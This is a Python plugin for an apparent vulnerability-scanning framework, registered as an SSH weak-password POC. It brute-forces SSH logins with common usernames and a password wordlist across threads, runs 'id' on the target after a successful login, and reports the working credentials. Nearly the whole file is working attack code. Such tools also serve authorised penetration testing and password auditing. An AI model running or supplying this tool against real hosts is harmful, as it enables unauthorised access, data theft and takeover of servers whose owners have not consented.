# !/usr/bin/python3
# -*-coding:utf-8-*-
# Author: Liang Ma
# CreatedDate: 2021/1/14 10:01
# Description:
import itertools
import logging
import queue
import socket

import paramiko

from lib.core.data import paths, logger
from lib.core.enums import VUL_TYPE, POC_CATEGORY
from lib.core.log import LOGGER
from lib.core.poc import POCBase, Output
from lib.core.register import register_poc
from lib.core.threads import run_threads

task_queue = queue.Queue()
result_queue = queue.Queue()


class DemoPOC(POCBase):
    vulID = '0001'
    version = 1
    author = ['liang.ma']
    vulDate = '2021-01-14'
    createDate = "2021-01-14"
    updateDate = "2021-01-14"
    references = ["https://help.aliyun.com/knowledge_detail/37479.html"]
    name = "SSH 弱口令"
    appPowerLink = ""
    appName = 'ssh'
    appVersion = "All"
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''
    攻击者可以通过 SSH 弱口令漏洞攻击，造成下列危害：
        在未授权的情况下远程访问服务器；
        更改其他用户访问 SSH 服务器的权限；
        窃取受权限控制的资源，造成数据泄漏；
        上传恶意文件至 SSH 服务器；
        破坏 SSH 服务器中的文件资源；
        可以通过提权获得服务器系统权限。
    '''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.SSH

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        host = self.getg_option('rhost')
        port = self.getg_option('rport') or 22
        ssh_burst(host, port)

        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
            return output


def get_word_list():
    common_username = ("test", "root", "guest", "admin", "daemon", "user")
    with open(paths.WEAK_PASS) as f:
        return itertools.product(common_username, f)


def port_check(host, port=22):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
        return False


def ssh_login(host, port, username=None, password=None) -> int:
    """
    检测登录是否成功
    :param host:
    :param port:
    :param username:
    :param password:
    :return: 0 失败，1 成功 ， 2误报
    """
    ret = 0
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(host, port, username, password)

        stdin, stdout, stderr = ssh.exec_command('id')

        res, err = stdout.read(), stderr.read()

        result = res if res else err
        result = result.decode('utf-8')
        if 'Please login' in result:
            ret = 2
            return ret
        else:
            ret = 1
    except Exception:
        pass
    finally:
        if ssh:
            ssh.close()

    return ret


def task_init(host, port):
    for username, password in get_word_list():
        task_queue.put((host, port, username.strip(), password.strip()))
        logger.debug('username: {} password:{}'.format(username, password))


def task_thread():
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        logger.debug('try burst {}:{} use username: {} password:{}'.format(host, port, username, password))
        status = ssh_login(host, port, username, password)
        if status == 1:
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))
        elif status == 2:
            with task_queue.mutex:
                task_queue.queue.clear()


def ssh_burst(host, port):
    logger.debug('use {} poc'.format(__file__))
    if not port_check(host, port):
        logger.debug('target {} is Unreachable'.format(host))
        return
    try:
        task_init(host, port)
        run_threads(4, task_thread)
    except Exception:
        pass


register_poc(DemoPOC)
